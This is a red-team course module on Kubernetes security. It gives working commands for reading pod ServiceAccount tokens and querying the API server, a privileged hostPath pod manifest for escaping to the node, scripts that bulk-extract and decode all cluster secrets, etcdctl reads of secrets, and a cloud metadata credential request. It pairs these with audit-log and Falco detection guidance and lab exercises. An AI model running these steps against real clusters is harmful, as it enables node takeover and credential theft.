---
title: "Kubernetes Security — Attack Surface, RBAC Abuse, and Pod Escape Concepts"
tags: [red-team, cloud, Kubernetes, K8s, RBAC, pod-escape, service-account,
  etcd, API-server, ATT&CK, T1613, T1552.007, T1610]
module: 08-RedTeam-03
day: 527
related_topics:
  - Azure Attack Lab (Day 526)
  - Container Escape Lab (Day 528)
  - Cross-Environment Attack Paths (Day 529)
---

# Day 527 — Kubernetes Security

> "Kubernetes was designed to run containers at scale, not to be secure by
> default. The API server is the brain — everything goes through it. The service
> account token is the credential — it is on every pod by default, readable by
> any process running in that pod. The etcd is the database — it contains every
> secret, every token, unencrypted unless you specifically turned encryption on.
> An attacker who reaches the API server with a useful token owns the cluster.
> That is the threat model."
>
> — Ghost

---

## Goals

Understand the Kubernetes architecture and its attack surface.
Enumerate K8s cluster resources and permissions from a compromised pod.
Identify high-value RBAC misconfigurations that lead to cluster admin.
Understand the attack paths from a pod to the underlying node and beyond.

**Prerequisites:** Day 525–526 (cloud red teaming), Linux container basics,
basic familiarity with YAML and the kubectl command line.
**Time budget:** 5 hours.

---

## Part 1 — Kubernetes Architecture and Attack Surface

```
Kubernetes cluster components:

  Control Plane (master):
    API Server (kube-apiserver): the only entry point; all kubectl commands,
      admission controllers, and internal components talk to it
    etcd: key-value store holding all cluster state — including Secrets,
      ServiceAccount tokens, and TLS certs
    Scheduler (kube-scheduler): assigns pods to nodes
    Controller Manager (kube-controller-manager): reconciles desired vs actual state

  Worker Nodes:
    kubelet: agent on each node; receives pod specs from the API server;
             exposes a local API (port 10250) for pod management
    kube-proxy: handles network rules for Service routing
    Container runtime: containerd or CRI-O (Docker is deprecated as runtime)

  Attack surface:
    ┌─────────────────────────────────────────────────────────────┐
    │ External entry point: exposed API server (port 6443/443)   │
    │ If accessible without auth: unauthenticated cluster access  │
    ├─────────────────────────────────────────────────────────────┤
    │ Inside a pod: ServiceAccount token (default: mounted)       │
    │ → Can authenticate to API server as the pod's SA            │
    │ → Permissions depend on RBAC rules assigned to the SA       │
    ├─────────────────────────────────────────────────────────────┤
    │ Kubelet API (port 10250): executes commands in pods         │
    │ If TLS but no auth: anonymous read; exec arbitrary commands │
    ├─────────────────────────────────────────────────────────────┤
    │ etcd (port 2379/2380): if accessible, all cluster secrets   │
    │ Not normally network-accessible from pods; internal only    │
    ├─────────────────────────────────────────────────────────────┤
    │ Metadata API (169.254.169.254): cloud provider IMDS         │
    │ Accessible from pods unless explicitly blocked by NetPol    │
    └─────────────────────────────────────────────────────────────┘
```

---

## Part 2 — Enumeration from Inside a Pod

### Reading the Service Account Token

```bash
# Every pod has a ServiceAccount token mounted by default at:
SA_TOKEN_PATH=/var/run/secrets/kubernetes.io/serviceaccount/token
CA_CERT_PATH=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)

SA_TOKEN=$(cat $SA_TOKEN_PATH)
# The token is a signed JWT — decode it to see the SA identity:
echo $SA_TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool
# → "sub": "system:serviceaccount:default:my-app-sa"
# → "namespace": "default"
```

### Querying the API Server from a Pod

```bash
APISERVER=https://kubernetes.default.svc
SA_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)

# Who am I?
curl -s --cacert $CA_CERT_PATH \
    -H "Authorization: Bearer $SA_TOKEN" \
    $APISERVER/api/v1/namespaces

# List pods in the current namespace:
curl -s --cacert $CA_CERT_PATH \
    -H "Authorization: Bearer $SA_TOKEN" \
    "$APISERVER/api/v1/namespaces/$NAMESPACE/pods" | python3 -m json.tool

# List secrets in the current namespace:
curl -s --cacert $CA_CERT_PATH \
    -H "Authorization: Bearer $SA_TOKEN" \
    "$APISERVER/api/v1/namespaces/$NAMESPACE/secrets"
# → If the SA has secrets:list → retrieves ALL secrets in the namespace

# Check own permissions (SelfSubjectAccessReview):
curl -s --cacert $CA_CERT_PATH \
    -H "Authorization: Bearer $SA_TOKEN" \
    -H "Content-Type: application/json" \
    -X POST "$APISERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" \
    -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview",
         "spec":{"resourceAttributes":{"verb":"get","resource":"secrets"}}}'
# → "allowed": true/false
```

### Using kubectl from Inside a Pod

```bash
# Install kubectl if not present (or use curl directly as above):
curl -LO "https://dl.k8s.io/release/$(curl -Ls https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
chmod +x kubectl && mv kubectl /tmp/kubectl

# Configure kubeconfig using the SA token:
/tmp/kubectl config set-cluster k8s \
    --server=https://kubernetes.default.svc \
    --certificate-authority=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt

/tmp/kubectl config set-credentials pod-sa \
    --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)

/tmp/kubectl config set-context default \
    --cluster=k8s --user=pod-sa --namespace=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)

/tmp/kubectl config use-context default

# Now use kubectl normally:
/tmp/kubectl get pods --all-namespaces
/tmp/kubectl get secrets
/tmp/kubectl auth can-i --list   # list all permitted actions
```

---

## Part 3 — RBAC Misconfigurations and Privilege Escalation

### High-Value RBAC Permissions

```
These RBAC permissions lead directly to cluster admin:

  pods/exec (verb: create on pods/exec subresource):
    → Allows running commands in any pod
    → If there is a pod running as root or with host PID/network:
      → exec into it → escape to node

  secrets:get/list (verb: get/list on secrets resource):
    → All cluster secrets, including:
      → SA tokens for more privileged service accounts
      → API keys, database passwords stored as Secrets
      → kubeconfig files stored as Secrets by some tools

  create:pods (verb: create on pods resource):
    → Create a privileged pod (hostPath: /, privileged: true)
    → Mount the node's filesystem → read node credentials
    → This is the most powerful RBAC permission after cluster-admin

  nodes/proxy:
    → Proxy traffic through the API server to any node's kubelet port
    → Use this to exec in pods on any node without pods/exec

  clusterrolebindings:create or rolebindings:create:
    → Grant cluster-admin to your own SA
    → Escalate without any other permission

  impersonate:
    → Impersonate any other user or SA
    → The most direct privilege escalation if available
```

### Exploiting create:pods for Cluster Admin

```yaml
# If the SA has pods:create + pods:exec in any namespace:
# Create a privileged pod that mounts the host filesystem:

apiVersion: v1
kind: Pod
metadata:
  name: priv-escape
  namespace: default
spec:
  hostPID: true             # see all host PIDs
  hostNetwork: true         # use host network namespace
  containers:
  - name: shell
    image: ubuntu:22.04
    securityContext:
      privileged: true      # full capabilities; seccomp/AppArmor disabled
    volumeMounts:
    - name: host-root
      mountPath: /host
  volumes:
  - name: host-root
    hostPath:
      path: /               # mount entire node filesystem at /host
  restartPolicy: Never
```

```bash
# Apply the escape pod:
/tmp/kubectl apply -f escape-pod.yaml

# Wait for it to be Running:
/tmp/kubectl get pod priv-escape

# Exec into the escape pod:
/tmp/kubectl exec -it priv-escape -- bash

# Inside the container — we have /host = node root filesystem:
ls /host/etc/kubernetes/
# → admin.conf (if this is a control plane node — full cluster admin kubeconfig)
# → pki/ (CA certs and keys)

# Read the kubelet config — contains credentials:
cat /host/var/lib/kubelet/config.yaml
cat /host/var/lib/kubelet/kubeconfig

# Chroot to the node filesystem for full node access:
chroot /host /bin/bash
# → Now running as root on the node itself
# → systemctl, ps, journalctl, iptables — full node control
# → Read cloud provider IMDS from the node IP (not the pod IP):
curl -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
# → Node's managed identity credentials (Azure)
```

---

## Part 4 — Secrets Extraction

### Reading Kubernetes Secrets

```bash
# List all secrets in all namespaces (if SA has secrets:list cluster-wide):
/tmp/kubectl get secrets --all-namespaces

# Read a specific secret:
/tmp/kubectl get secret db-credentials -n production -o json
# → Data is base64-encoded:
# "data": {
#   "username": "cm9vdA==",
#   "password": "UGFzc3dvcmQxMjM="
# }

# Decode all secret values:
/tmp/kubectl get secret db-credentials -n production -o json | \
    python3 -c "
import json,sys,base64
data = json.load(sys.stdin)['data']
for k,v in data.items():
    print(f'{k}: {base64.b64decode(v).decode()}')
"

# Bulk-extract all secrets from all namespaces:
/tmp/kubectl get secrets --all-namespaces -o json | \
    python3 -c "
import json,sys,base64
items = json.load(sys.stdin)['items']
for item in items:
    ns = item['metadata']['namespace']
    name = item['metadata']['name']
    for k,v in item.get('data',{}).items():
        try:
            val = base64.b64decode(v).decode()
            print(f'{ns}/{name}/{k}: {val}')
        except: pass
" 2>/dev/null | grep -i "pass\|key\|token\|secret\|aws\|azure"
```

### etcd — The Source of Truth

```bash
# etcd stores ALL cluster state in plaintext unless at-rest encryption is enabled
# Check if etcd is accessible from the node (usually localhost:2379):

# From a compromised node (after hostPath escape):
ETCDCTL_API=3 etcdctl \
    --endpoints=https://127.0.0.1:2379 \
    --cacert=/etc/kubernetes/pki/etcd/ca.crt \
    --cert=/etc/kubernetes/pki/etcd/server.crt \
    --key=/etc/kubernetes/pki/etcd/server.key \
    get /registry/secrets --prefix --keys-only
# → Lists all secret paths in etcd

# Read a specific secret from etcd (bypasses K8s RBAC entirely):
ETCDCTL_API=3 etcdctl \
    --endpoints=https://127.0.0.1:2379 \
    --cacert=/etc/kubernetes/pki/etcd/ca.crt \
    --cert=/etc/kubernetes/pki/etcd/server.crt \
    --key=/etc/kubernetes/pki/etcd/server.key \
    get /registry/secrets/production/db-credentials
# → Raw value (etcd protobuf encoded, but passwords are plaintext within)
# → grep for familiar patterns: password, aws, secret, token

# etcd at-rest encryption: check if enabled:
cat /etc/kubernetes/manifests/kube-apiserver.yaml | grep "encryption-provider"
# → If no --encryption-provider-config: etcd is unencrypted
```

---

## Part 5 — Detection

```
Kubernetes audit log (kube-apiserver audit):
  Configured via --audit-policy-file — may not be enabled by default

Key events to alert on:

  Verb=exec on pods:
    apiGroup: ""
    resource: "pods"
    subresource: "exec"
    → Any exec into a pod from a non-CI/CD SA is suspicious

  Verb=get/list on secrets by a non-admin SA:
    resource: "secrets"
    user: "system:serviceaccount:default:app-sa"
    → SA that should not read secrets (app-sa) reading secrets

  Pod creation with privileged:true or hostPath:/:
    Parse requestObject.spec.securityContext.privileged
    Parse requestObject.spec.volumes[].hostPath.path
    → Immediate alert: any privileged pod or host root mount

  RBAC permission changes:
    Verb=create/update on clusterrolebindings or rolebindings
    → Unexpected escalation of SA permissions

Falco — runtime security for Kubernetes:
  Falco monitors system calls inside containers in real-time
  Built-in rules detect:
    → Shell spawned in a container (execve of bash/sh/python)
    → Reading of sensitive files (/etc/shadow, /proc/*/mem)
    → Writing to host filesystem (hostPath mounts)
    → Outbound network connections from a container to unusual IPs

  Example Falco rule:
    - rule: Shell in container
      desc: A shell was spawned in a container
      condition: spawned_process and container and shell_procs
      output: "Shell spawned in container (container=%container.name
               command=%proc.cmdline)"
      priority: WARNING
```

---

## Key Takeaways

1. The Kubernetes ServiceAccount token is always present in every pod unless
   explicitly disabled (`automountServiceAccountToken: false`). Any code running
   in a pod — including SSRF-exploited application code — can read this token
   and use it to authenticate to the API server. Disable auto-mounting in pods
   that do not need API server access.
2. `pods:create` is the most dangerous single RBAC permission below cluster-admin.
   The ability to create pods allows creation of a privileged pod with hostPath
   volume, which grants root on the underlying node. Treat `pods:create` as
   equivalent to node admin.
3. Kubernetes Secrets are not secret. They are base64-encoded, not encrypted,
   and visible to any SA with `secrets:get`. Enable etcd at-rest encryption and
   use external secret managers (HashiCorp Vault, AWS Secrets Manager via CSI
   driver) instead of Kubernetes Secrets for sensitive data.
4. etcd is the database that contains everything. If an attacker reaches a
   control plane node and can access the etcd TLS certificates (default location:
   /etc/kubernetes/pki/etcd/), they can read all secrets, all SA tokens, and the
   cluster CA — bypassing Kubernetes RBAC entirely. Protect control plane nodes
   at the OS level, not just the API level.
5. Runtime detection (Falco) is the most effective Kubernetes-specific detection
   layer. API server audit logs catch API-level activity, but process execution
   inside containers (shell spawns, file writes) requires system call monitoring.
   Deploy both layers.

---

## Exercises

1. Set up a local Kubernetes lab (kind or minikube). Create a namespace `webapp`
   with a ServiceAccount `app-sa`. Grant it `secrets:list` in the `webapp`
   namespace. Deploy a pod with this SA. From inside the pod, list and decode all
   secrets in the namespace.
2. Grant `app-sa` the `pods:create` verb in `webapp`. From inside the app pod,
   create the escape pod YAML from Part 3. Exec into it. Verify you can read
   the host's filesystem via `/host`. What files under `/host/etc/kubernetes/`
   are readable?
3. Enable the Kubernetes API audit log in your lab cluster (set `--audit-policy-file`
   in the kube-apiserver manifest). Perform a `kubectl exec` into a pod. Verify
   the audit log captures the exec event. Write a grep/jq command to filter the
   audit log for all exec events in the past hour.
4. Install Falco in the lab cluster. Trigger the "Shell in container" rule by
   exec-ing into a pod and running `bash`. Verify the Falco alert fires. Then
   try to read `/etc/shadow` inside the container — what Falco rule fires?

---

## Questions

> Add your questions here. Each question gets a Global ID (Q527.1, Q527.2 …).

---

## Navigation

← Previous: [Day 526 — Azure Attack Lab](DAY-0526-Azure-Attack-Lab.md)
→ Next: [Day 528 — Container Escape Lab](DAY-0528-Container-Escape-Lab.md)
